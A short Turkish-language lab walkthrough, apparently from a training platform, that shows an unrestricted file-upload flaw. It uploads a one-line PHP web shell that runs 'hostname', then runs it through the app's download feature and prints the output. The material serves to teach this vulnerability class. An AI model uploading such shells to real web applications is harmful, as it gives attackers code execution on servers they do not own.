# Absent Validation

Dosya yüklemeye izin veren bir web uygulamasını ele alalım:

![](assets/01.png)

Seçilen dosya adı, uygulama üzerinde gözüküyor:

![](assets/02.png)

Uygulamaya ait Upload özelliği, dosyayı karşıya yüklemek için kullanılır:

![](assets/03.png)

Dosya içeriği aşağıda verilmiştir:

```php title="shell.php" linenums="1"
<?php system("hostname"); ?>
```

Uygulamaya ait Download File özelliği, yüklenen PHP kodunu çalıştırmak için kullanılır:

```output title="Output"
ng-954801-fileuploadsabsentverification-brnyi-df695dd68-qgnlv
```
